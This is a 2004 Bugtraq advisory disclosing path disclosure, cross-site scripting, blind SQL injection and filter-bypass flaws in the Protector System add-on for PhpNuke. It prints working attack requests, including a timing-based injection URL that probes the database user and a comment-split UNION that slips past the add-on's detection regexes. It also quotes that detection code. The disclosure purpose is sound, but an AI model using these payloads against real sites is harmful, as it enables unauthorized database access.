@@ -1,0 +1,257 @@
+
+Date: 23 Apr 2004 18:32:02 -0000
+From: Janek Vind <come2waraxe@...oo.com>
+To: bugtraq@...urityfocus.com
+Subject: [waraxe-2004-SA#025 - Multiple vulnerabilities in Protector
+    System 1.15b1 for PhpNuke]
+
+
+
+
+
+
+{================================================================================}
+{                              [waraxe-2004-SA#025]                              }
+{================================================================================}
+{                                                                                }
+{      [ Multiple vulnerabilities in Protector System 1.15b1 for PhpNuke ]       }
+{                                                                                }
+{================================================================================}
+                                                                                                                                
+Author: Janek Vind "waraxe"
+Date: 23. April 2004
+Location: Estonia, Tartu
+Web: http://www.waraxe.us/index.php?modname=sa&id=25
+
+
+Affected software description:
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+Protector System - A PHPNuke addon for blocking ip numbers from your site & prevent
+hack attempt!
+
+Creator: Marcus aka Mister
+Mail: mister@...center.se
+Home page: http://www.warcenter.se
+Support page: http://protector.warcenter.se
+
+
+Vulnerabilities:
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+A. Full path disclosure:
+
+A1 - unchecked user submitted variable "portNum" (in integrated Network Query Tool)
+
+If we make http request like this:
+
+http://localhost/nuke72/admin/modules/blocker_query.php?target=foobar.com&queryType=all&portNum=foobar
+
+... then we will see standard php error messages, revealing full path to script:
+
+Warning: fsockopen() expects parameter 2 to be long, string given in D:\apache_wwwroot\nuke72\admin\modules\blocker_query.php on line 305
+Port foobar does not appear to be open.
+
+Reason is, that script does not check validity of the portNum, which must be integer in range of 1..65535.
+
+
+
+B. Cross-site scripting aka XSS (in integrated Network Query Tool)
+
+
+B1 - XSS through unsanitaized user submitted variable "target"
+
+http://localhost/nuke72/admin/modules/blocker_query.php?target=foobar.com">[xss code here]
+
+
+B2 - XSS through unsanitaized user submitted variable "portNum"
+
+http://localhost/nuke72/admin/modules/blocker_query.php?target=foobar.com&queryType=all&portNum=foobar[xss code here]
+
+
+
+C. Sql injection:
+
+C1 - noncritical sql injection in "blocker.php"
+
+Let's look at original code in /includes/blocker.php line 252:
+
+
+if( isset( $_SERVER ) ) { $ref_addr = $_SERVER['HTTP_REFERER']; }
+        else { $ref_addr = getenv( 'HTTP_REFERER' ); }
+        
+        if( isset( $_SERVER ) ) 
+        { 
+        	$last_page = $_SERVER['SCRIPT_NAME'];
+        	if (($_SERVER['QUERY_STRING']) != "") { $last_page = $last_page . "?" . $_SERVER['QUERY_STRING'] ;}
+        	$query_blocker = $_SERVER['QUERY_STRING'] ;
+        }
+        else
+        {
+		$last_page = getenv(SCRIPT_NAME);
+		if ((getenv(QUERY_STRING)) != "") { $last_page = $last_page . "?" . getenv(QUERY_STRING) ;}
+	}
+		$last_page = urldecode($last_page);
+
+As we can see, $last_page has value of the urldecoded QUERY_STRING. So if we will add to query
+string something like %27, then after urldecode() we have "'" (single quote) and this can be
+beginning of the brand new sql injection case. Let's look further:
+
+            ###################################
+ 		#Page Tracker Function by Kipuka
+ 		#
+ 		###################################
+		if ($tracker_del_on == 1) {
+                $max_tracker_check = $db->sql_query("SELECT count(*) as count FROM ".$prefix."_blocked_pagetracker WHERE id_tracker = '$access_id'");
+                $numrows = $db->sql_numrows($max_tracker_check);
+		
+                if ($numrows > 0) {
+                list($count) = $db->sql_fetchrow($max_tracker_check);
+                }
+				//die("$last_page");
+                if ($count < $tracker_max_b) {
+                $db->sql_query("INSERT DELAYED INTO ".$prefix."_blocked_pagetracker (last_page ,page_date ,id_tracker) VALUES ('$last_page', '$date', '$access_id')");
+				
+				$sqlx = "INSERT DELAYED INTO ".$prefix."_blocked_pagetracker (last_page ,page_date ,id_tracker) VALUES ('$last_page', '$date', '$access_id')";
+				$xxx = mysql_error();
+				//die("$xxx");
+				
+                } else {
+                $tracker_limitB = $count - $tracker_max_b;
+                $result = $db->sql_query("SELECT id FROM ".$prefix."_blocked_pagetracker WHERE id_tracker = '$access_id' ORDER BY page_date LIMIT ".$tracker_limitB.",1");
+                $numrows = $db->sql_numrows($result);
+                if ($numrows > 0) {
+                    $row = $db->sql_fetchrow($result);
+                    $page_id = $row['id'];
+                    $db->sql_query("DELETE FROM ".$prefix."_blocked_pagetracker WHERE id_tracker = '$access_id' AND id <= '$page_id'");
+                }
+					$xxx = mysql_error();
+					die("$xxx");
+            		$db->sql_query("INSERT INTO ".$prefix."_blocked_pagetracker (last_page ,page_date ,id_tracker) VALUES ('$last_page', '$date', '$access_id')");
+        	    }
+		}
+
+So, sql injection possibility exists, but not in "SELECT FROM" clause, but in "INSERT INTO" construction. So forget the
+UNION and JOIN tricks. And MySql version 4.1 is not yet in wide use, so we can't use subselects ...
+Therefore this is noncritical sql injection case, but anyway, potential attacker can use this security hole to
+accomplish some tasks by using of the built-in mysql functions like:
+
+DATABASE()
+USER()
+SYSTEM_USER()
+SESSION_USER()
+VERSION()
+
+Because attacker does'nt have the visual feedback from script, "blindfolded" methods must be used, for example
+"benchmark" method. This can be implemented in perl (php, python, etc...) script, using http requests similar to this:
+
+http://localhost/nuke72/index.php?foobar%27,IF(ord(mid(USER(),1,1))%3d114,benchmark(500000,md5(1337)),1),2)/*
+
+I have written proof of concept code in perl for this exploit and it works perfectly.
+
+
+D. Easy bypass of the anti-sql-injection filters
+
+Protector System implements various filters against XSS and sql injection. Examples:
+
+...
+
+//IF the user sending any  $_SERVER["HTTP_REFERER"] then continue 
+if (strlen($_SERVER["HTTP_REFERER"]) > 0) { 
+      //If the user is POSTing from another server do a scan 
+if(eregi("(^|[^a-zA-Z0-9])union(\ )+(all\ |distinct\ )?(\ )*select\ |\.\.\/", $sTemp) && !ereg("(http://$_SERVER[HTTP_HOST])", $_SERVER["HTTP_REFERER"]))
+    	{
+  		$original_ip = long2ip(-(4294967296-$ipcheck));
+		$the_error = "User $the_blocked_user with IP $original_ip tried to send information thru a POST method\r\n"
+ 
+...
+
+if(eregi("(^|[^a-zA-Z0-9])union(\ )+(all\ |distinct\ )?(\ )*select\ |\.\.\/", $sTemp))
+	{
+	//Just send a mail incase =)
+	if ($pro_mail && $pro_mail != '' && $mail_blocker == '1') { mail($pro_mail, $blocker_subject, $the_unset_error, $headers); }
+           unset($_POST[$FormFieldName]);
+           echo "<p><h1>Your Attempt to use SQL exploit was blocked</h1>";
+     	   echo "<i>Powered whit Protector System</i>";
+     	   die();
+         }
+	}
+
+...
+
+if($sec_cookieB == '1')
+{
+foreach ($_COOKIE as $cookie_name => $value_cookie) {
+    $result = $db ->sql_query("SELECT cookie FROM ".$prefix."_blocked_agent WHERE cookie = '$cookie_name'");
+    if($db->sql_numrows($result)>0 && !empty($_COOKIE))
+    {    		 
+	if (eregi("union\ |&#?[a-zA-Z0-9]+;|:\/\/|\.\.\/|[$<>{}\(\)\"'`]", $value_cookie)) { 
+	$value_cookie = htmlspecialchars($value_cookie, ENT_QUOTES);
+	setcookie($cookie_name,"", time() - 3600);
+           	unset($_COOKIE[$cookie_name]);
+            } 
+}
+
+...
+
+###########################################################################
+#Block unvanted GET code!
+#Security scan of REQUEST_METHOD GET 
+#
+############################################################################
+if($sec_getB == '1')
+{
+if ((eregi("admin.php", $_SERVER['PHP_SELF']) && preg_match("/\?admin/", "$last_page")) OR (eregi("(^|[^a-zA-Z0-9])union(\ )+(all\ |distinct\ )?(\ )*select\ |\.\.\/", $last_page)) OR (stristr($last_page, "admin="))) 
+{
+
+...
+
+Nice try - not only GET, but POST and COOKIE variables get sanitized too ;)
+But look, what i have readed some days ago:
+
+http://www.imperva.com/application_defense_center/white_papers/sql_injection_signatures_evasion.html
+
+This whitepaper, written by Ofer Maor and Amichai Shulman, describes various methods to
+bypass sql injection detection and the final conclusion is:
+
+"At this point, we believe the conclusion of this paper is clear to the
+reader. Signature protection against SQL Injection is simply not
+enough. Although this paper demonstrates only some of the variety
+of evasion techniques for avoiding SQL Injection signatures, some or
+even all of these techniques are likely to operate on most of today's
+signature protection mechanisms."
+
+I`m hundred percent agree with this. So let's try to fool sql injection filters in 
+Protector System in practice. First, we make request like this:
+
+http://localhost/nuke72/index.php?foo=bar%20UNION%20SELECT%20ALL%20FROM%20WHERE
+
+Oops, we got caught by Protector System: "The ip 127.0.0.1 has been blocked!"
+
+Ok, it's time to show, how to evade this filter with using of the sql comments:
+
+http://localhost/nuke72/index.php?foo=bar%20U/**/NION%20SELECT%20ALL%20FROM%20WHERE
+
+Bingo! Filter does let us through!
+
+
+
+Greetings:
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+    Greets to torufoorum members and to all bugtraq readers in Estonia! Tervitused!
+Special greets to http://www.gamecheaters.us staff!
+
+
+
+Contact:
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+    come2waraxe@...oo.com
+    Janek Vind "waraxe"
+
+    Homepage: http://www.waraxe.us/
+
+---------------------------------- [ EOF ] ------------------------------------
+
+
